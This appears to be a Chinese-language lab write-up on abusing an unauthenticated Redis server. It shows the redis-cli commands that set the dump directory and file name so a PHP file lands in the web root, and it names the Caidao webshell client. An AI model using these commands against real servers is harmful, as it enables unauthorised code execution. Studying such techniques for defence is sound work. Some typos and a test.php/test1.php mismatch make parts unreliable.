# 利用Redis 的持久化写webshell

## 1.配置环境

```bash
由于靶场没有开启 web 服务器，配置好 apache 和 php

firewall-cmd --zone=public --add-port=80/tcp --permanent		#开80端口
firewall-cmd --list-ports
firewall-cmd --reload
firewall-cmd --list-ports

systemctl restart firewalld.service 				#重启防火墙

yum install php php-mysq!-y					#安装php5

php -v							#验证

安装apache: yum -yinstall httpd*



vi /etc/httpd/conf/httpd.conf
在配置文件中修改如下:
添加如下内容
AddType application/x-httpd-php-source.phps
AddType application/x-httpd-php.php
```

![image-20240530153411137](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530153411137.png)

```php
php -v
cd /var/www/html
Is
vi info.php
编写如此 php 文件
<?php phpinfo();?>

systemctl restart httpd
    
    
测试：
    ip/info.php
```

## 2.攻击条件

```bash
靶机 Redis链接未授权，在攻击机上能用redis-cli 连上，如上图，并未登陆验证
开了 web 服务器，并且知道路径(如利用 phpinfo，或者错误爆路经)，还需要具有文件读写增删改查权限(我们可以将 dir 设置为一个目录 A,而 dbfilename为文件名 B,再执行 save或bgsave，则我们就可以写入一个路径为/A/B的任意文件。)
在html目录下写入一个test.php的木马文件:
攻击机写下如下 redis 命令
192.168.137.11:6379> config set dir /var/www/html
OK
192.168.137.11:6379> config set dbfilename test.php
OK
192.168.137.11:6379> set webshell "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
OK
192.168.137.11:6379>save
OK


cd /var/www/html
ls
cat test1.php

```

## 菜刀

```
http://ip/test1.php


caidao
```

